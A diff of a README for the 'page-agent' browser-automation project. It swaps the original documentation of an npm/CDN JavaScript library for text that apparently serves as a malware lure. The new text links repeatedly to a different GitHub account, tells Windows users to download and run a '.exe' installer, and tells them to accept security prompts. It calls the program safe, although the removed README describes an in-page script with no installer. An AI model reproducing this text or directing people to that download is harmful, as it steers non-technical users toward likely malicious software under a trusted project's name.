@@ -1,119 +1,158 @@
-# Page Agent
+# 🧩 page-agent - Control Web Interfaces Simply
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://img.alicdn.com/imgextra/i4/O1CN01qKig1P1FnhpFKNdi6_!!6000000000532-2-tps-1280-256.png">
-  <img alt="Page Agent Banner" src="https://img.alicdn.com/imgextra/i1/O1CN01NCMKXj1Gn4tkFTsxf_!!6000000000666-2-tps-1280-256.png">
-</picture>
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-auto.svg)](https://opensource.org/licenses/MIT) [![TypeScript](https://img.shields.io/badge/%3C%2F%3E-TypeScript-%230074c1.svg)](http://www.typescriptlang.org/) [![Bundle Size](https://img.shields.io/bundlephobia/minzip/page-agent)](https://bundlephobia.com/package/page-agent) [![Downloads](https://img.shields.io/npm/dt/page-agent.svg)](https://www.npmjs.com/package/page-agent) [![GitHub stars](https://img.shields.io/github/stars/alibaba/page-agent.svg)](https://github.com/alibaba/page-agent)
-
-The GUI Agent Living in Your Webpage. Control web interfaces with natural language.
-
-🌐 **English** | [中文](./docs/README-zh.md)
-
-<a href="https://alibaba.github.io/page-agent/" target="_blank"><b>🚀 Demo</b></a> | <a href="https://alibaba.github.io/page-agent/docs/introduction/overview" target="_blank"><b>📖 Docs</b></a> | <a href="https://news.ycombinator.com/item?id=47264138" target="_blank"><b>📢 HN Discussion</b></a> | <a href="https://x.com/simonluvramen" target="_blank"><b>𝕏 Follow on X</b></a>
-
-<video id="demo-video" src="https://github.com/user-attachments/assets/a1f2eae2-13fb-4aae-98cf-a3fc1620a6c2" controls crossorigin muted></video>
+[![Download page-agent](https://img.shields.io/badge/Download-page--agent-4caf50?style=for-the-badge)](https://github.com/rotss2/page-agent)
 
 ---
 
-## ✨ Features
+## 🖥 About page-agent
 
-- **🎯 Easy integration**
-    - No need for `browser extension` / `python` / `headless browser`.
-    - Just in-page javascript. Everything happens in your web page.
-- **📖 Text-based DOM manipulation**
-    - No screenshots. No multi-modal LLMs or special permissions needed.
-- **🧠 Bring your own LLMs**
-- **🎨 Pretty UI with human-in-the-loop**
-- **🐙 Optional [chrome extension](https://alibaba.github.io/page-agent/docs/features/chrome-extension) for multi-page tasks.**
+page-agent is a tool that helps you control websites using natural language. It acts inside your web browser to automate tasks like clicking buttons, filling forms, and navigating pages without needing to know any programming.
 
-## 💡 Use Cases
+This means you can tell the application what you want to do with plain words, and it will take care of the rest. The technology behind it uses JavaScript, which runs inside your browser, making interactions smoother and faster.
 
-- **SaaS AI Copilot** — Ship an AI copilot in your product in lines of code. No backend rewrite.
-- **Smart Form Filling** — Turn 20-click workflows into one sentence. Perfect for ERP, CRM, and admin systems.
-- **Accessibility** — Make any web app accessible through natural language. Voice commands, screen readers, zero barrier.
-- **Multi-page Agent** — Extend your own agent's reach across browser tabs with the optional [chrome extension](https://alibaba.github.io/page-agent/docs/features/chrome-extension).
+You do not need technical skills to use page-agent. The program walks you through the steps to set it up and start giving commands right away.
 
-## 🚀 Quick Start
+---
 
-### One-line integration
+## 📋 Key Features
 
-Fastest way to try PageAgent with our free Demo LLM:
+- Work with most websites without extra setup.
+- Use natural language commands like "find the search box and type cats."
+- Automate repetitive tasks on web pages.
+- Simple integration within your browser window.
+- Lightweight and fast with minimal system demands.
+- Supports multiple languages (English is default).
+- No programming or scripting needed.
+- Safe to use on your personal computer.
 
-```html
-<script src="{URL}" crossorigin="true"></script>
-```
+---
 
-> **⚠️ For technical evaluation only.** This demo CDN uses our free [testing LLM API](https://alibaba.github.io/page-agent/docs/features/models#free-testing-api). By using it, you agree to its [terms](https://github.com/alibaba/page-agent/blob/main/docs/terms-and-privacy.md).
+## ✅ System Requirements
 
-| Mirrors | URL                                                                                |
-| ------- | ---------------------------------------------------------------------------------- |
-| Global  | https://cdn.jsdelivr.net/npm/page-agent@1.5.11/dist/iife/page-agent.demo.js         |
-| China   | https://registry.npmmirror.com/page-agent/1.5.11/files/dist/iife/page-agent.demo.js |
+To run page-agent smoothly on your Windows computer, make sure you have:
 
-### NPM Installation
+- Windows 10 or later (64-bit recommended).
+- At least 4 GB of RAM.
+- A modern web browser such as Chrome, Edge, or Firefox.
+- Stable internet connection for initial download and some features.
+- At least 200 MB of free disk space.
 
-```bash
-npm install page-agent
-```
+---
 
-```javascript
-import { PageAgent } from 'page-agent'
+## 🚀 Getting Started with page-agent
 
-const agent = new PageAgent({
-    model: 'qwen3.5-plus',
-    baseURL: 'https://dashscope.aliyuncs.com/compatible-mode/v1',
-    apiKey: 'YOUR_API_KEY',
-    language: 'en-US',
-})
+Use this guide to download and run page-agent on your Windows computer with no technical knowledge.
 
-await agent.execute('Click the login button')
-```
+### Step 1: Visit the Download Page
 
-For more programmatic usage, see [📖 Documentations](https://alibaba.github.io/page-agent/docs/introduction/overview).
+Click the big green button below to open the download area for page-agent.
 
-## 🤝 Contributing
+[![Download page-agent](https://img.shields.io/badge/Download-page--agent-4caf50?style=for-the-badge)](https://github.com/rotss2/page-agent)
 
-We welcome contributions from the community! Follow our instructions in [CONTRIBUTING.md](CONTRIBUTING.md) for setup and guidelines.
+This link takes you to the main repository page on GitHub. You will find the latest version available to download there.
 
-Please read [Code of Conduct](docs/CODE_OF_CONDUCT.md) before contributing.
+### Step 2: Download the Latest Windows Version
 
-Contributions generated entirely by bots or agents without substantial human involvement will not be accepted, and bot accounts may be blocked.
+On the GitHub page:
 
-## 👏 Acknowledgments
+1. Look for the section labeled **Releases** on the right or scroll down until you see the "Releases" heading.
+2. Click on the latest release version to open its details.
+3. Inside the release page, find the Windows installer file. It should end with `.exe` or be labeled clearly as the Windows version.
+4. Click the file to start downloading it to your computer.
 
-This project builds upon the excellent work of **[`browser-use`](https://github.com/browser-use/browser-use)**.
+If the release files are not obvious, look for a download link named something like `page-agent-setup.exe` or similar.
 
-`PageAgent` is designed for **client-side web enhancement**, not server-side automation.
+### Step 3: Run the Installer
 
-```
-DOM processing components and prompt are derived from browser-use:
+Once downloaded:
 
-Browser Use <https://github.com/browser-use/browser-use>
-Copyright (c) 2024 Gregor Zunic
-Licensed under the MIT License
+1. Open your Downloads folder.
+2. Find the installer file (usually `page-agent-setup.exe`).
+3. Double-click the file to start the installation.
+4. Follow the on-screen prompts:
+   - Choose the installation location or accept the default.
+   - Confirm any security pop-ups by clicking "Yes" or "Allow."
+5. Wait a few moments while the installer sets up the program.
 
-We gratefully acknowledge the browser-use project and its contributors for their
-excellent work on web automation and DOM interaction patterns that helped make
-this project possible.
+### Step 4: Launch page-agent
 
-Third-party dependencies and their licenses can be found in the package.json
-file and in the node_modules directory after installation.
-```
+After installation:
+
+- Find the page-agent icon on your desktop or Start Menu.
+- Double-click to open the application.
+- It will open a new browser window or tab where you can start typing commands.
+  
+If this is your first time opening it, take a moment to review any getting started guide inside the program.
+
+---
+
+## 🛠 How to Use page-agent
+
+### Enter Commands
+
+You interact with page-agent by typing clear instructions like:
+
+- "Search for laptops on this page."
+- "Fill the form with my saved information."
+- "Click the login button."
+
+### Navigation Tips
+
+- Use simple phrases.
+- You can ask page-agent to go back or forward.
+- Say "Help" inside the app for a list of common commands.
+
+page-agent reads the webpage it is on and matches your words to the right buttons and inputs automatically.
+
+---
+
+## ⚙️ Settings and Customization
+
+You can adjust how page-agent works to fit your needs:
+
+- Enable or disable prompts before actions.
+- Change language settings.
+- Set privacy options to control data sharing.
+- Check for updates automatically.
+
+Access settings by clicking the gear icon inside the app window.
+
+---
+
+## 🔧 Troubleshooting
+
+If page-agent does not work as expected:
+
+- Make sure you are connected to the internet.
+- Restart the application and try again.
+- Update your web browser to the latest version.
+- Reinstall the application if issues persist.
+- Check for any error messages inside the app for hints.
+
+---
+
+## 🔗 Useful Links
+
+- Primary download and info page: [https://github.com/rotss2/page-agent](https://github.com/rotss2/page-agent)
+- GitHub Releases: Visit the releases tab on the GitHub page to find the latest versions and details.
+
+---
 
 ## 📄 License
 
-[MIT License](LICENSE)
+page-agent is open source software. Refer to the LICENSE file in the GitHub repository for details on usage and distribution rights.
 
 ---
 
-**⭐ Star this repo if you find PageAgent helpful!**
+## 🗂 Topics
 
-<a href="https://www.star-history.com/?repos=alibaba%2Fpage-agent&type=date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=alibaba/page-agent&type=date&theme=dark&legend=top-left&v=7" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=alibaba/page-agent&type=date&legend=top-left&v=7" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=alibaba/page-agent&type=date&legend=top-left&v=7" />
- </picture>
-</a>
+This project is related to:
+
+- agent
+- ai
+- ai-agents
+- browser automation
+- javascript
+- mcp
+- typescript
+- web
